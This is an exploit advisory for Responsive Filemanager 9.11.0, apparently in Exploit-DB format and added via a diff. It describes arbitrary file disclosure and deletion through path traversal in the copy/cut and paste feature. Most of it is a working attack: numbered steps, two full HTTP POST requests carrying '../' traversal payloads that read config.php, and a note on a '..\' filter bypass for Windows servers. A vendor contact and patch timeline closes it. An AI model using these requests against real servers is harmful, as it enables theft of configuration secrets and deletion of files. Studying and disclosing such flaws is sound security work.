@@ -1,0 +1,77 @@
+[+] Exploit Title: Responsive Filemanger <= 9.11.0 - Arbitrary File Disclosure/Deletion
+[+] Date: 7 Feb 2017
+[+] Vulnerability and Exploit Author: Wiswat Aswamenakul
+[+] Vendor Homepage: http://www.responsivefilemanager.com/
+[+] Affected version: only tested on 9.11.0 and 9.7.3 (other versions might be affected)
+[+] Tested on: Ubuntu 14.04, PHP 5.5.9
+[+] Category: webapps
+
+[+] Description
+Responsive filemanger is a PHP based file manager that make use of AJAX
+technology. It has various useful features. One of them is copy/cut and
+paste files. However, the copy/cut feature does not santize file name
+that will be copied/cut. Therefore, it is possible for attackers to
+copied/cut any files including PHP files and paste them to overwrite
+existing image files. Then, the attackers could download the overwritten
+image files to read the content of the copied/cut files. Moreover, for
+the cut feature, it can cause the original files to be deleted as well.
+
+[+] Exploit
+1. Upload a normal image file (jpg, png, gif) to a server
+2. Right click at any files, select copy and capture the request with Burp Suite (or any local proxy)
+3. Change parameter "path" to any file name that we would like to download, for example, path=../filemanager/config/config.php
+
+###
+POST /fm/filemanager/ajax_calls.php?action=copy_cut HTTP/1.1
+Host: 192.168.1.128
+Content-Length: 53
+Accept: */*
+Origin: http://192.168.1.128
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer:
+http://192.168.1.128/fm/filemanager/dialog.php?editor=0&type=0&lang=en_EN&popup=0&crossdomain=0&field_id=&relative_url=0&akey=key&fldr=%2F&5869110e2a073
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: last_position=%2F; PHPSESSID=lenmc074o86fe2sq7i1dtnh8j0
+Connection: close
+
+path=../filemanager/config/config.php&sub_action=copy
+###
+
+4. Go to any sub directory, right click at any files, intercept the request with burp, select "Paste to this directory"
+5. Change parameter "path" to the image file uploaded in step 1, for example, path=subdir/size.png
+
+###
+POST /fm/filemanager/execute.php?action=paste_clipboard HTTP/1.1
+Host: 192.168.1.128
+Content-Length: 20
+Accept: */*
+Origin: http://192.168.1.128
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML,
+like Gecko) Chrome/55.0.2883.87 Safari/537.36
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer:
+http://192.168.1.128/fm/filemanager/dialog.php?editor=0&type=0&lang=en_EN&popup=0&crossdomain=0&field_id=&relative_url=0&akey=key&fldr=subdir%2F&5869110f9a268
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: last_position=subdir%2F; PHPSESSID=lenmc074o86fe2sq7i1dtnh8j0
+Connection: close
+
+path=subdir/size.png
+###
+
+6. Download the image file uploaded in step 1, it will contain content of the file specified in step 3
+
+[+] Note (about another issue I found)
+During this report, I found another separated issue with the attack filtering that only check for "../" but not "..\" which can be used to bypass all filters if the application runs on Windows server and reported the issue to the owner as well. However, I found out that this issue was found by a guy from hacktizen and detailed in following blog post
+http://hacktizen.blogspot.com/2016/06/responsive-filemanager-9102-directory.html
+So, the credit goes for the guy who firstly reported. Perhaps, the guy from hackitizen did not contact the owner of responsive filemanger or there are any problems with communication. Therefore, the issue remains unresolved.
+
+[+] Timeline
+- 02/01/2017: Contact Owner
+- 05/02/2017: Patched version is available
+- 07/02/2017: Public Advisory
